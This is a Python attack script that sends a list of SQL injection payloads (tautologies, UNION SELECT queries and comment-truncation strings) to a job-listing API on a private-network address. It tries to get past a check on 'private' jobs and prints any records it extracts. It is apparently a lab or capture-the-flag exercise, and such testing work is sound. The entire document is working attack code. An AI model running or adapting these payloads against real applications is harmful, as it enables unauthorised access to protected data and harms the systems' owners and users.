#!/usr/bin/env python3
import requests
import json

url = "http://192.168.31.233:8000/jobs"
headers = {"Content-Type": "application/json"}

print("[*] Testing Advanced SQL Injection Bypasses...\n")

# Try various payloads that might keep SQL valid
payloads = [
    # Try to bypass with OR conditions
    ("' OR 1=1--", "Tautology with comment"),
    ("' OR '1'='1", "Tautology without comment"),
    ("' OR type LIKE '%'--", "LIKE wildcard"),
    ("' OR type != 'xxx'--", "NOT EQUALS"),

    # Try to inject additional OR conditions
    ("private' OR 'x'='x' OR type='", "Bypass private check"),
    ("xxx' OR type='private' OR 'a'='a", "Get private via OR"),

    # Try UNION with no WHERE (might bypass the check)
    ("' OR 1=0 UNION SELECT * FROM jobs--", "UNION all jobs"),
    ("' OR 1=0 UNION SELECT * FROM jobs WHERE 1=1--", "UNION conditional"),

    # Try to comment out the rest of the query
    ("private'--", "Comment out check"),
    ("private'#", "Hash comment"),
    ("private'/*", "Block comment start"),
]

for payload, description in payloads:
    try:
        data = {"job_type": payload}
        resp = requests.post(url, headers=headers, json=data, timeout=5)
        print(f"[{resp.status_code}] {description}")
        print(f"    Payload: {payload}")

        if resp.status_code == 200:
            try:
                jobs = resp.json()
                if isinstance(jobs, list) and len(jobs) > 0:
                    print(f"    ✓ SUCCESS! Got {len(jobs)} jobs:")
                    for job in jobs:
                        print(f"      - ID:{job.get('id')} Type:{job.get('type')} Name:{job.get('name')}")
                else:
                    print(f"    Response: {resp.text[:100]}")
            except:
                print(f"    Response: {resp.text[:100]}")
        elif resp.status_code != 500:
            print(f"    Response: {resp.text[:100]}")
        print()
    except Exception as e:
        print(f"    Error: {e}\n")

print("\n[*] Testing complete!")
